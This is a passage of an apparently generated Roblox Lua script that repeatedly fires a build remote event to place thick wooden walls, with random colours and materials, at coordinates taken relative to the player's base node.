0.866019249, 0.749993801, -0.500085354, -0.432924747))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1281.83118, 375.493958, -725.262024, 0.250115693, 0.865964949, 0.433066756, -0.866025984, 8.51750374e-05, 0.499998927, 0.432944685, -0.500104666, 0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1281.83118, 375.493958, -725.262024, 0.432979524, 0.866023481, 0.250064135, -0.500003278, -8.10623169e-05, 0.866023481, 0.750016928, -0.500003278, 0.432979524))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1281.83118, 375.493958, -725.262024, 0.499938965, 0.866060615, 1.18613243e-05, 1.18613243e-05, -2.05039978e-05, 1, 0.866060615, -0.499938965, -2.05039978e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1281.83118, 375.493958, -725.262024, 0.433011115, 0.865976095, -0.250173539, 0.50001061, 0.000167369843, 0.866019249, 0.749993801, -0.500085354, -0.432924747))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1281.83118, 375.493958, -725.262024, -2.06232071e-05, 0.86604017, 0.499974549, -1.00000012, -2.06232071e-05, -5.49852848e-06, 5.49852848e-06, -0.499974549, 0.866040111))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1260.88428, 375.493561, -688.98468, -2.06232071e-05, 0.86604017, 0.499974549, -1.00000012, -2.06232071e-05, -5.49852848e-06, 5.49852848e-06, -0.499974549, 0.866040111))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1260.88428, 375.493561, -688.98468, 0.250115693, 0.865964949, 0.433066756, -0.866025984, 8.51750374e-05, 0.499998927, 0.432944685, -0.500104666, 0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1260.88428, 375.493561, -688.98468, 0.432979524, 0.866023481, 0.250064135, -0.500003278, -8.10623169e-05, 0.866023481, 0.750016928, -0.500003278, 0.432979524))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1260.88428, 375.493561, -688.98468, 0.499938965, 0.866060615, 1.18613243e-05, 1.18613243e-05, -2.05039978e-05, 1, 0.866060615, -0.499938965, -2.05039978e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1368.9823, 318.141937, -641.641174, 0.866051912, 0, 0.499954134, 0, 1, 0, -0.499954134, 0, 0.866051912))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1372.97412, 317.956696, -676.552368, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1295.64209, 317.856842, -625.070068, -0.500045776, 0, 0.865998983, 0, -1, 0, 0.865998983, 0, 0.500045776))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1316.21826, 317.956635, -725.538696, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1309.4303, 317.954926, -729.237549, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1280.83289, 317.956635, -719.21344, 0.866051912, 0, 0.499954134, 0, 1, 0, -0.499954134, 0, 0.866051912))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1259.88538, 317.956635, -682.926331, 0.866051912, 0, 0.499954134, 0, 1, 0, -0.499954134, 0, 0.866051912))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1244.20007, 318.238739, -655.454956, 0.866051912, 0, 0.499954134, 0, 1, 0, -0.499954134, 0, 0.866051912))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1344.02417, 318.238739, -597.829834, 0.866051912, 0, 0.499954134, 0, 1, 0, -0.499954134, 0, 0.866051912))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1365.00452, 318.238739, -634.173767, 0.866051912, 0, 0.499954134, 0, 1, 0, -0.499954134, 0, 0.866051912))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1351.90125, 317.956635, -704.939209, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1289.08008, 320.593781, -617.607239, 2.05039978e-05, -0.499938965, 0.866060615, -1, -2.05039978e-05, 1.18613243e-05, 1.18613243e-05, -0.866060615, -0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1310.29492, 320.3862, -654.356323, 2.05039978e-05, -0.499938965, 0.866060615, -1, -2.05039978e-05, 1.18613243e-05, 1.18613243e-05, -0.866060615, -0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1254.85168, 317.956635, -628.065186, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1319.06018, 320.3862, -600.300049, 2.05039978e-05, -0.499938965, 0.866060615, -1, -2.05039978e-05, 1.18613243e-05, 1.18613243e-05, -0.866060615, -0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1314.76563, 317.956635, -593.477478, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1250.15198, 342.524902, -628.177185, 0.433034241, 0.499921203, 0.750040054, 0.866027713, -5.24520874e-06, -0.499995947, -0.249954671, 0.866070867, -0.432947874))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1317.83997, 342.524506, -589.104614, 0.433034241, 0.499921203, 0.750040054, 0.866027713, -5.24520874e-06, -0.499995947, -0.249954671, 0.866070867, -0.432947874))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1317.83997, 342.524506, -589.104614, 2.05039978e-05, 0.499938965, 0.866060615, 1, -2.05039978e-05, -1.18613243e-05, 1.18613243e-05, 0.866060615, -0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1317.83997, 342.524506, -589.104614, 0.433034241, 0.499921203, -0.750040054, -0.866027713, 5.24520874e-06, -0.499995947, -0.249954671, 0.866070867, 0.432947934))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1317.83997, 342.524506, -589.104614, 0.750030518, 0.499926746, 0.433044404, 0.500032485, -4.06503677e-05, -0.866006672, -0.432922333, 0.866067708, -0.250010133))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1317.83997, 342.524506, -589.104614, 0.866040111, 0.499974549, -5.5283308e-06, 5.5283308e-06, -2.06232071e-05, -0.99999994, -0.499974549, 0.866040051, -2.06232071e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1317.83997, 342.524506, -589.104614, 0.750030518, 0.499926746, -0.433044404, -0.500032485, 4.05311584e-05, -0.866006672, -0.432922333, 0.866067708, 0.250010014))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1250.15198, 342.524902, -628.177185, -0.750030637, 0.499926746, 0.433044404, 0.500032485, 4.05311584e-05, 0.866006672, 0.432922333, 0.866067708, -0.250010133))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1250.15198, 342.524902, -628.177185, 0.866040111, 0.499974549, -5.5283308e-06, 5.5283308e-06, -2.06232071e-05, -0.99999994, -0.499974549, 0.866040051, -2.06232071e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1250.15198, 342.524902, -628.177063, 0.750030518, 0.499926746, 0.433044404, 0.500032485, -4.06503677e-05, -0.866006672, -0.432922333, 0.866067708, -0.250010133))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1283.80078, 373.718292, -608.753479, 0.433034241, 0.499921203, 0.750040054, 0.866027713, -5.24520874e-06, -0.499995947, -0.249954671, 0.866070867, -0.432947874))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1250.15198, 342.524902, -628.177063, -0.433034182, 0.499921203, 0.750040054, 0.866027713, 5.24520874e-06, 0.499995947, 0.249954671, 0.866070867, -0.432947874))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1250.15198, 342.524902, -628.177185, 2.05039978e-05, 0.499938965, 0.866060615, 1, -2.05039978e-05, -1.18613243e-05, 1.18613243e-05, 0.866060615, -0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1283.80078, 373.718292, -608.753479, 2.05039978e-05, 0.499938965, 0.866060615, 1, -2.05039978e-05, -1.18613243e-05, 1.18613243e-05, 0.866060615, -0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1283.80078, 373.718292, -608.753479, 0.866040111, 0.499974549, -5.5283308e-06, 5.5283308e-06, -2.06232071e-05, -0.99999994, -0.499974549, 0.866040051, -2.06232071e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1283.80078, 373.718292, -608.753479, 0.750030518, 0.499926746, 0.433044404, 0.500032485, -4.06503677e-05, -0.866006672, -0.432922333, 0.866067708, -0.250010133))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1283.80078, 373.718292, -608.753479, 0.433034241, 0.499921203, -0.750040054, -0.866027713, 5.24520874e-06, -0.499995947, -0.249954671, 0.866070867, 0.432947934))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1283.80066, 373.718292, -608.75354, 0.750030518, 0.499926746, -0.433044404, -0.500032485, 4.05311584e-05, -0.866006672, -0.432922333, 0.866067708, 0.250010014))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1316.70593, 317.856842, -661.557617, 0.866007268, 0, 0.500031412, 0, -1.00000024, 0, 0.500031412, 0, -0.866007447))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1279.94873, 320.291534, -671.874939, 2.05039978e-05, -0.499938965, 0.866060615, -1, -2.05039978e-05, 1.18613243e-05, 1.18613243e-05, -0.866060615, -0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1316.70593, 317.856842, -661.557617, 0, 0, -1, 0, -1, -0, -1, 0, -0))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1316.70593, 317.856842, -661.557617, 0.500045776, 0, -0.865998983, 0, -1, -0, -0.865998983, 0, -0.500045776))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1337.37195, 317.856842, -697.356018, -0.500045776, 0, 0.865998983, 0, -1, 0, 0.865998983, 0, 0.500045776))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, 